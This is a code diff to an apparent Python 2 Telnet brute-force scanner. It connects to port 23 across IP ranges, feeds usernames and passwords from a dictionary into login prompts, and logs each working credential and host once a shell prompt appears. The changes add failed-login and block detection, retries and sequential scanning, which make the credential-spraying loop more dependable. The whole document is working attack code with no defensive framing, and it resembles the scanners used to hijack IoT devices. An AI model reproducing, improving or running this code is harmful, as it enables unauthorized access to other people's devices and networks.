@@ -283,43 +283,77 @@ def prompt_shell(data):
     return False
 
 
+def prompt_block(data):
+    if "block" in data:
+        return True
+    return False
+
+def prompt_login_failed(data):
+    if "ncorrect" in data:
+        return True
+    if "ailed" in data:
+        return True
+    return False
+
+
 def optimus(ip):
     if not is_open_port_23(ip):
         sys.exit(1)
     logging.debug("O: " + ip)
     print "try ", ip
-    for key, values in dic.items():
-        for value in values:
+    tried = 0
+    i = 0
+    for key in dic:
+        values = dic[key]
+        while i < len(values):
+            just_prompted_IAC = False
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((ip, 23))
                 s.settimeout(60)
-
+                print key, values[i]
                 while True:
                     data = s.recv(4096)
                     if not data:
                         break
                     else:
                         if prompt_IAC(data):
+                            just_prompted_IAC = True
                             commandControl(s, data)
                             continue
+                        elif prompt_login_failed(data):
+                            break
                         elif prompt_login(data):
+                            just_prompted_IAC = False
                             s.send(key + "\r\n")
                             continue
                         elif prompt_reply_user(key + "\r\n", data):
+                            just_prompted_IAC = False
                             continue
                         elif prompt_password(data):
-                            s.send(value + "\r\n")
+                            just_prompted_IAC = False
+                            s.send(values[i] + "\r\n")
                             continue
                         elif prompt_end_password(data):
+                            just_prompted_IAC = False
                             continue
                         elif prompt_shell(data):
-                            logging.info(key + ":" + value + "@" + ip)
+                            logging.info(key + ":" + values[i] + "@" + ip)
                             sys.exit(1)
+                        elif prompt_block(data):
+                            logging.debug("BLOCK: " + ip)
+                            sys.exit(1)
+                        elif just_prompted_IAC:
+                            continue
                         else:
                             break
-            except Exception, e:
-                sys.exit(1)
+                i += 1
+            except:
+                if tried > 1:
+                    sys.exit(1)
+                tried += 1
+                i -= 1
+                time.sleep(5)
 
 
 def scan_random_ip(maxThreadNum):
@@ -341,17 +375,15 @@ def scan_with_iprange(listip, maxThreadNum):
             net = IPNetwork(line.strip())
             for ip in net:
                 ip = str(ip)
-                # if not is_alive(ip):
-                #     continue
-                # logging.debug("*")
-                while threading.activeCount() > maxThreadNum:
-                    time.sleep(1)
-                p = Thread(target=optimus, args=[ip])
-                p.daemon = True
-                threads.append(p)
-                p.start()
-    for i in threads:
-        i.join()
+                optimus(ip)
+    #             while threading.activeCount() > maxThreadNum:
+    #                 time.sleep(1)
+    #             p = Thread(target=optimus, args=[ip])
+    #             p.daemon = True
+    #             threads.append(p)
+    #             p.start()
+    # for i in threads:
+    #     i.join()
 
 
 if __name__ == "__main__":
